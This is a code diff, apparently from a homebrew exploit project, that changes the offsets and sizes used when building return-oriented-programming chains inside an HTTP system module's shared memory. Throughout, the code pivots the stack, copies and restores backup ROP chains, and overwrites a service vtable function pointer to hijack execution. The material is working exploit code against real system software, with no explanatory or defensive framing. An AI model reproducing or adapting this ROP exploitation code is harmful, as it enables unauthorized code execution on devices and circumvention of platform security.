@@ -479,10 +479,11 @@ Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, vu32 *ropvmem_shar
 	u32 *ropchain = (u32*)ropvmem_sharedmem;
 	u32 ropvaddr = ropvmem_base;
 
-	u32 createcontext_ropoffset = 0x300;
-	u32 createcontext_bakropoff = 0x800;
-	u32 createcontext_roplaunch_bakaddr;
-	u32 createcontext_roplaunch_baksize;
+	u32 ropallocsize = 0x500;
+	u32 ropoffset = 0x200;
+	u32 bakropoff = ropoffset + ropallocsize;
+	u32 roplaunch_bakaddr;
+	u32 roplaunch_baksize;
 
 	u32 created_contexthandle_stackaddr;
 
@@ -499,24 +500,24 @@ Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, vu32 *ropvmem_shar
 	ropgen_copyu32(&ropchain, &ropvaddr, __httpmainthread_cmdhandler_stackframe + 24 + 12, ropheap+0x4, 0x3);//Copy the _this value for httpc_cmdhandler, from the saved r7 in the httpc_cmdhandler stackframe to ropheap+0x4.
 
 	//Copy the backup CreateContext ROP-chain to the main offset then pivot to the main CreateContext ROP-chain.
-	ropgen_memcpy(&ropchain, &ropvaddr, ropvmem_base+createcontext_ropoffset, ropvmem_base+createcontext_bakropoff, 0x500);
-	ropgen_stackpivot(&ropchain, &ropvaddr, ropvmem_base+createcontext_ropoffset);
+	ropgen_memcpy(&ropchain, &ropvaddr, ropvmem_base+ropoffset, ropvmem_base+bakropoff, ropallocsize);
+	ropgen_stackpivot(&ropchain, &ropvaddr, ropvmem_base+ropoffset);
 
-	if(ropvaddr-ropvmem_base > createcontext_ropoffset)
+	if(ropvaddr-ropvmem_base > ropoffset)
 	{
-		printf("The initial CreateContext ROP-chain in ropvmem is 0x%08x-bytes too large.\n", (unsigned int)(ropvaddr-ropvmem_base - createcontext_ropoffset));
+		printf("The initial CreateContext ROP-chain in ropvmem is 0x%08x-bytes too large.\n", (unsigned int)(ropvaddr-ropvmem_base - ropoffset));
 		return -2;
 	}
 
 	//Create a backup of the above ROP.
-	createcontext_roplaunch_bakaddr = ropvaddr+0x100;
-	createcontext_roplaunch_baksize = ropvaddr - ropvmem_base;
-	memcpy((u32*)&ropvmem_sharedmem[(createcontext_roplaunch_bakaddr-ropvmem_base)>>2], (u32*)ropvmem_sharedmem, createcontext_roplaunch_baksize);
+	roplaunch_bakaddr = ropvaddr+0x100;
+	roplaunch_baksize = ropvaddr - ropvmem_base;
+	memcpy((u32*)&ropvmem_sharedmem[(roplaunch_bakaddr-ropvmem_base)>>2], (u32*)ropvmem_sharedmem, roplaunch_baksize);
 
-	ropchain = (u32*)&ropvmem_sharedmem[createcontext_bakropoff>>2];
-	ropvaddr = ropvmem_base+createcontext_ropoffset;
+	ropchain = (u32*)&ropvmem_sharedmem[bakropoff>>2];
+	ropvaddr = ropvmem_base+ropoffset;
 
-	ropgen_memcpy(&ropchain, &ropvaddr, ropvmem_base, createcontext_roplaunch_bakaddr, createcontext_roplaunch_baksize);//Restore the initial CreateContext ROP using the backup.
+	ropgen_memcpy(&ropchain, &ropvaddr, ropvmem_base, roplaunch_bakaddr, roplaunch_baksize);//Restore the initial CreateContext ROP using the backup.
 
 	ropgen_writeu32(&ropchain, &ropvaddr, ROP_CreateContext, __custom_mainservsession_vtable + 0x8, 1);//Restore the vtable funcptr back to the original sysmodule one.
 
@@ -554,13 +555,13 @@ Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, vu32 *ropvmem_shar
 
 	ropgen_stackpivot(&ropchain, &ropvaddr, __httpmainthread_cmdhandler_stackframe-4);
 
-	if(ropvaddr-ropvmem_base > createcontext_bakropoff)
+	if(ropvaddr-ropvmem_base > bakropoff)
 	{
-		printf("The main CreateContext ROP-chain in ropvmem is 0x%08x-bytes too large.\n", (unsigned int)(ropvaddr-ropvmem_base - createcontext_bakropoff));
+		printf("The main CreateContext ROP-chain in ropvmem is 0x%08x-bytes too large.\n", (unsigned int)(ropvaddr-ropvmem_base - bakropoff));
 		return -2;
 	}
 
-	ropvaddr = ropvaddr - createcontext_ropoffset + createcontext_bakropoff;
+	ropvaddr = ropvaddr - ropoffset + bakropoff;
 	if(ropvaddr > __custom_contextservsession_vtable)
 	{
 		printf("The backup version of the main CreateContext ROP-chain in ropvmem is 0x%08x-bytes too large.\n", (unsigned int)(ropvaddr - __custom_contextservsession_vtable));
